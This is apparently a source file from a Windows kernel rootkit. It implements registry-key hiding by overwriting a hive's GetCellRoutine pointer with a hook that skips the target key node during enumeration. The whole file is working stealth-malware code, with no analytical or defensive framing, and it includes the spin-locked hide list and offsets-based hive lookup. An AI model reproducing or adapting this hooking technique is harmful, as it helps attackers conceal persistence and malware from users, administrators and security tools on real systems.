#include "rk.h"
#include "InitializeInjectRelevantInfo.h"
#include "HideReg.h"

LIST_ENTRY g_HideKeyList;
KSPIN_LOCK g_SpinLockHideKeyList;

void InitializeHideKeyList()
{
	InitializeListHead(&g_HideKeyList);
	KeInitializeSpinLock(&g_SpinLockHideKeyList);
}
HANDLE OpenKeyByName(PWCHAR pKeyNameW)
{
	NTSTATUS Status;
	UNICODE_STRING UniKeyName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hKey;
	RtlInitUnicodeString(&UniKeyName,pKeyNameW);
	InitializeObjectAttributes(&ObjectAttributes,&UniKeyName,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
	Status = ZwOpenKey(&hKey,KEY_READ,&ObjectAttributes);
	if(!NT_SUCCESS(Status))
	{
		return NULL;
	}
	return hKey;
}
PVOID GetKeyControlBlock(HANDLE hKey)
{
	NTSTATUS Status;
	PCM_KEY_BODY pKeyBody;
	PVOID pCmKeyCtlBlock;

	if(hKey == NULL)
	{
		return NULL;
	}
	pCmKeyCtlBlock = NULL;
	pKeyBody = NULL;
	Status = STATUS_SUCCESS;

	Status = ObReferenceObjectByHandle(hKey,KEY_READ,NULL,KernelMode,&pKeyBody,NULL);
	if(NT_ERROR(Status))
	{
		return NULL;
	}
	pCmKeyCtlBlock = (PVOID)pKeyBody->KeyControlBlock;
	ObDereferenceObject(pKeyBody);
	return pCmKeyCtlBlock;
}


PVOID GetLastKeyNode(PVOID pHive,PCM_KEY_NODE pNode,PGET_CELL_ROUTINE pGetCellRoutine)
{
	// get parent Node
	PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)pGetCellRoutine(pHive,pNode->Parent);

	PCM_KEY_INDEX Index = (PCM_KEY_INDEX)pGetCellRoutine(pHive,ParentNode->SubKeyLists[0]);

	//DbgPrint("ParentNode = 0x%x, IndexList = 0x%x\n", ParentNode,Index);
	//DbgPrint("ParentNode->SubKeyCounts[0] : %d, ParentNode->SubKeyCounts[1] : \
	//%d\n",ParentNode->SubKeyCounts[0],ParentNode->SubKeyCounts[1]);
	//DbgPrint("Signature : 0x%x, Index->Count : %d\n",(USHORT)Index->Signature,Index->Count);

	if(Index->Signature == CM_KEY_INDEX_ROOT)
	{
		Index = (PCM_KEY_INDEX)pGetCellRoutine(pHive,Index->List[Index->Count - 1]);
	}

	if(Index->Signature == CM_KEY_FAST_LEAF || Index->Signature == CM_KEY_HASH_LEAF)
	{
		return pGetCellRoutine(pHive,Index->List[2 * (Index->Count - 1)]);
	}
	else
	{
		return pGetCellRoutine(pHive,Index->List[ Index->Count - 1 ]);
	}
}


PVOID MyGetCellRoutine(PVOID pHive,HANDLE Cell)
{
	PVOID pRetValue;
	PLIST_ENTRY pCurEntry;
	PHIDE_KEY_LIST pHideKeyList;

	pCurEntry = NULL;
	pRetValue = NULL;
	pHideKeyList = NULL;

	if (!IsListEmpty(&g_HideKeyList))
	{
		for (pCurEntry = g_HideKeyList.Flink;pCurEntry != &g_HideKeyList;pCurEntry = pCurEntry->Flink)
		{
			pHideKeyList = CONTAINING_RECORD(pCurEntry,HIDE_KEY_LIST,NextHideKey);
			if (pHideKeyList->pHive == pHive)
			{
				break;
			}
		}
	}
	pRetValue = pHideKeyList->pGetCellRoutine(pHive,Cell);
	if(pRetValue)
	{
		//if pGetCellRoutine return the node to hide
		if(pRetValue == pHideKeyList->pHideNode)
		{
			//get last KeyNode and save it in LastNode
			pRetValue = pHideKeyList->pLastNode = (PCM_KEY_NODE)GetLastKeyNode(pHive, \
				pHideKeyList->pHideNode, \
				pHideKeyList->pGetCellRoutine);
			//if our HideNode=LastNode, return NULL	
			if(pRetValue == pHideKeyList->pHideNode)
			{
				pRetValue = NULL;
			}
		}
		//after, when we reach the LastNode we return NULL
		else if(pRetValue == pHideKeyList->pLastNode)
		{
			pRetValue = pHideKeyList->pLastNode = NULL;
		}
	}
	return pRetValue;
}
NTSTATUS CmHideKey(PWCHAR pHideKeyPathW)
{
	HANDLE hHideKey;
	PVOID pCmKeyCtlBlock;
	PHHIVE pHive;
	NTSTATUS Status;
	PHIDE_KEY_LIST pHideKeyList;
	PGET_CELL_ROUTINE pGetCellRoutine;
	PGET_CELL_ROUTINE *ppGetCellRoutine;
	KIRQL Irql;

	PCM_KEY_NODE pHideNode = NULL;

	hHideKey = NULL;
	pCmKeyCtlBlock = NULL;
	pHive = NULL;
	Status = STATUS_UNSUCCESSFUL;
	pHideKeyList = NULL;
	pGetCellRoutine = NULL;
	ppGetCellRoutine = NULL;
	pHideNode = NULL;
	//get a handle witch reference a KEY_BOY struct
	hHideKey = OpenKeyByName(pHideKeyPathW);
	if (NULL == hHideKey)
	{
		return Status;
	}
	//get KEY_CONTROL_KEY associated with the key mapping
	pCmKeyCtlBlock = (PVOID)GetKeyControlBlock(hHideKey);
	if (pCmKeyCtlBlock == NULL)
	{
		return Status;
	}
	if(pCmKeyCtlBlock)
	{
		pHive = (PHHIVE)*(PULONG)((ULONG)pCmKeyCtlBlock + \
			g_InjectRelevantOffset.CmKeyOffset.ulOffsetKeyHive);
		if (MmIsAddressValid(pHive))
		{
			//save address of GetCellRoutine variable in hive struct
			ppGetCellRoutine = &pHive->GetCellRoutine;
			//save GetCellRoutine function address
			pGetCellRoutine = pHive->GetCellRoutine;

			if (MmIsAddressValid(pGetCellRoutine))
			{
				do 
				{
					pHideKeyList = ExAllocatePool(NonPagedPool,sizeof(HIDE_KEY_LIST));
				} while (NULL == pHideKeyList);
				RtlZeroMemory(pHideKeyList,sizeof(HIDE_KEY_LIST));
				InitializeListHead(&pHideKeyList->NextHideKey);
				RtlCopyMemory(pHideKeyList->HideKeyNameW,pHideKeyPathW,wcslen(pHideKeyPathW) * sizeof(WCHAR));
				pHideKeyList->pGetCellRoutine = pGetCellRoutine;
				pHideKeyList->ppGetCellRoutine = ppGetCellRoutine;
				pHideKeyList->pHive = pHive;

				//get the KeyNode to hide
				pHideNode = (PCM_KEY_NODE)pGetCellRoutine(pHive, \
					(HANDLE)*(PULONG)((ULONG)pCmKeyCtlBlock + g_InjectRelevantOffset.CmKeyOffset.ulOffsetKeyCell));
				pHideKeyList->pHideNode = pHideNode;

				KeAcquireSpinLock(&g_SpinLockHideKeyList,&Irql);
				InsertTailList(&g_HideKeyList,&pHideKeyList->NextHideKey);
				KeReleaseSpinLock(&g_SpinLockHideKeyList,Irql);
				//replace GetCellRoutine by MyGetCellRoutine
				pHive->GetCellRoutine = MyGetCellRoutine;
				Status = STATUS_SUCCESS;
			}
		}
	}
	ZwClose(hHideKey);
	return Status;
}